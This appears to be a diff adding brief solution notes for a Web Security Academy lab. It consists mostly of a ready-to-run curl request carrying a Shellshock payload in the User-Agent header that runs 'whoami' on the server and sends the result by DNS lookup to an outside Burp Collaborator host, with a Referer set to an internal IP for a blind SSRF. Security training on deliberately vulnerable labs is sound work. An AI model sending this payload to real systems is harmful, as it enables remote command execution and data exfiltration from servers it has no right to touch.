@@ -1,0 +1,17 @@
+
+
+this chalange must be use burp collaborator with this request:
+
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0af2005d040f59a1818ee3e800c4008c.web-security-academy.net' \
+	-H $'User-Agent: () { :; }; /usr/bin/nslookup $(whoami).gj3kaip0qctts48oq1gpbvh9309sxil7.oastify.com' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' \
+	-H $'Referer: http://192.168.0.7:8080/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=aPrjW3NVZKohl8JPeYnjrdahiIcAKP6L' \
+    $'https://0af2005d040f59a1818ee3e800c4008c.web-security-academy.net/product?productId=11'
+	
+	
+	
+	
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).gj3kaip0qctts48oq1gpbvh9309sxil7.oastify.com
+Referer: http://192.168.0.7:8080/
